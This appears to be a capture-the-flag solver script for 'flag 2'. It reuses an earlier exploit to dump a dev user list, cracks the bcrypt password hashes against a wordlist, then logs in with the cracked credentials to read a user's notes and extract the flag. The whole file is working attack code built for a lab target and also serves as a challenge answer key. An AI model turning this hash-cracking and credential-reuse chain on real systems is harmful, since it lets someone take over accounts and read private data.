#!/usr/bin/env python3
"""Flag 2 — Hash cracking + reading the cracked user's notes.

Steps:
  1. Get the dev /users dump (re-running the Flag 1 exploit, or accepting an
     already-collected list).
  2. For each user with a BCrypt hash, run a small wordlist against it. One
     hash matches "sunshine" within seconds.
  3. Authenticate to the gateway with the cracked credentials and GET /notes.
  4. Pull Flag 2 out of the user's notes — including the hint about the
     archivist and searching by department.
"""

from __future__ import annotations

import json
import sys
import time

import bcrypt
import requests

from common import (
    DEFAULT_GATEWAY,
    WORDLIST_PATH,
    banner,
    basic_auth_header,
    detail,
    die,
    dump,
    find_flag,
    section,
)
import solve_flag1


def crack(users: list[dict], wordlist: list[str]) -> tuple[str, str] | None:
    detail("flag2", "candidate words", len(wordlist))
    detail("flag2", "first 5 words", wordlist[:5])
    detail("flag2", "users with hashes", sum(1 for u in users if u.get("passwordHash")))

    attempts = 0
    started = time.perf_counter()
    for u in users:
        h = u.get("passwordHash")
        if not h:
            detail("flag2", f"  skip {u.get('username','?')}", "no hash")
            continue
        banner("flag2", f"  → trying wordlist against {u['username']}")
        for word in wordlist:
            attempts += 1
            if bcrypt.checkpw(word.encode(), h.encode()):
                elapsed = time.perf_counter() - started
                detail("flag2", "  attempts", attempts)
                detail("flag2", "  elapsed", f"{elapsed:.2f}s")
                banner("flag2", f"  ✓ HIT: {u['username']!r} → {word!r}")
                return u["username"], word
    detail("flag2", "total attempts", attempts)
    return None


def run(gateway: str, users: list[dict] | None = None) -> tuple[str, str, str]:
    section("flag2", "STEP 1 — obtain user list (with bcrypt hashes)")
    if users is None:
        banner("flag2", "no user list supplied — running Flag 1 exploit first")
        _, users = solve_flag1.run(gateway)
    else:
        detail("flag2", "users supplied", len(users))
        banner("flag2", "  ✓ reusing user list from caller (Flag 1 already ran)")

    section("flag2", "STEP 2 — crack hashes against local wordlist")
    detail("flag2", "wordlist path", str(WORDLIST_PATH))
    wordlist = WORDLIST_PATH.read_text().splitlines()
    wordlist = [w.strip() for w in wordlist if w.strip()]

    banner("flag2", f"trying {len(wordlist)} candidate passwords against {len(users)} hashes")
    cracked = crack(users, wordlist)
    if not cracked:
        die("none of the seeded hashes matched the wordlist")
    username, password = cracked
    banner("flag2", f"cracked: {username}:{password}")

    section("flag2", "STEP 3 — authenticate to gateway and read /notes")
    url = f"{gateway}/notes"
    detail("flag2", "GET URL", url)
    detail("flag2", "auth scheme", "HTTP Basic")
    detail("flag2", "auth user", username)
    detail("flag2", "auth password", password)

    r = requests.get(
        url,
        headers=basic_auth_header(username, password),
        timeout=10,
    )
    detail("flag2", "response status", r.status_code)
    detail("flag2", "response length", f"{len(r.text)} bytes")
    if r.status_code != 200:
        die(f"/notes failed: {r.status_code} {r.text}")
    banner("flag2", "  ✓ gateway accepted credentials")

    section("flag2", "STEP 4 — extract flag from notes body")
    flag = find_flag(r.text)
    if not flag:
        die("no flag found in cracked user's notes")
    detail("flag2", "notes preview", r.text[:200].replace("\n", " ⏎ "))
    try:
        dump("flag2", "full /notes response", r.json())
    except ValueError:
        dump("flag2", "full /notes response", r.text)
    banner("flag2", f"FLAG 2 = {flag}")
    return flag, username, password


def main() -> None:
    gateway = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_GATEWAY
    flag, username, password = run(gateway)
    print()
    print(json.dumps({"flag2": flag, "username": username, "password": password}, indent=2))


if __name__ == "__main__":
    main()
